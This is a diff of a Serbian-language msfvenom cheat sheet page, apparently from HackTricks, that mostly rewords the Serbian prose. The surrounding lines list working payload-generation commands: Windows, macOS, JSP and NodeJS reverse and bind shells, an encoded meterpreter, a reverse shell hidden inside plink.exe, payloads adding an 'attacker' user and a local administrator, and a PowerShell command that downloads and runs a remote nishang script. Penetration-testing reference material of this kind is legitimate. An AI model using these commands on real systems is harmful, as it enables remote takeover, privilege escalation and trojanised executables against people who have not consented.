@@ -1,12 +1,14 @@
 # MSFVenom - CheatSheet
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ---
 
 ## Osnovni msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Koristite `-a` za izbor architecture payload-a, a `--platform` za izbor ciljne platforme.<sup>[[1]](#references)</sup>
+Koristite `-a` da izaberete arhitekturu payload-a, a `--platform` da izaberete ciljnu platformu.<sup>[[1]](#references)</sup>
 
 ## Izlistavanje
 ```bash
@@ -23,7 +25,7 @@ Ove komande prikazuju payload i encoder module dostupne u instaliranom framework
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-Ovde prikazane zastavice određuju bad characters, output format, encoder i broj iteracija encoding-a.<sup>[[1]](#references)</sup>
+Ove zastavice određuju bad characters, output format, encoder i broj encoding iterations.<sup>[[1]](#references)</sup>
 
 ## **Windows**
 
@@ -43,7 +45,7 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **Izvršavanje komande**
+### **Izvrši komandu**
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
@@ -52,7 +54,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### Ugrađeno unutar izvršne datoteke
+### Ugrađeno u izvršnu datoteku
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
@@ -81,7 +83,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ma
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-## **Payload-i zasnovani na web-u**
+## **Payload-i zasnovani na vebu**
 
 ### **PHP**
 
@@ -113,7 +115,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Payloadi u skriptnim jezicima**
+## **Payload-i skriptnih jezika**
 
 ### **Perl**
 ```bash
